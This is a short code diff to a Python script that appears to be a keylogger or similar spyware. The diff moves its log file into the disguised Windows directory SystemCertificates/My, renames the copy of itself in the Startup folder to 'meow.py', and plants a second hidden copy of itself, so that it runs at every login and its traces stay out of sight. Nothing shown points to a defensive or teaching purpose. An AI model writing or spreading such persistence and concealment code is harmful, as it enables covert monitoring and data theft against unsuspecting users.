@@ -40,10 +40,11 @@ for script in python_scripts:
 
 
 username = os.getlogin()
-logging_directory = f"/Users/{username}/Desktop"
+logging_directory = f"C:/Users/{username}/AppData/Roaming/Microsoft/SystemCertificates/My"
 
 
-copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')
+copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/meow.py')
+copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/SystemCertificates/My/meow.py')
 
 
 logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
